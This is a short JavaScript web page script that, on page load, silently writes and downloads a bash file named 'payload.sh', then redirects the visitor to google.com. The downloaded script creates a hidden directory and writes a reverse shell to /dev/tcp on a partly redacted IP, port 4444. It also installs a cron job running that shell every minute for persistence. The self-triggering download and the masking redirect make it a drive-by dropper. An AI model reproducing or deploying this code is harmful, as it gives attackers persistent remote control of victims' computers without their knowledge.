function download(){
	let save = "#!/bin/bash\n\n" + "mkdir ~/.totallyNotAVirus\n\n" +
	"cd ~/.totallyNotAVirus\n\n" + "touch shell.cgi\n" +
	"echo \"/bin/bash -i >& /dev/tcp/192.168.0.xxx/4444 0<&1\" > shell.cgi\n" +
	"chmod 777 shell.cgi\n\n" + "touch temp\n" +
	"crontab -l > temp\n" + "echo \"* * * * * ~/.totallyNotAVirus/shell.cgi\" >> temp\n" +
	"crontab temp\n" + "rm temp";
	var blob = new Blob([save], {
		type: "text/plain;charset=utf-8"
	});
	saveAs(blob, "payload.sh")
};
window.onload = function(){
	download();
	window.location.replace("https://google.com/")

}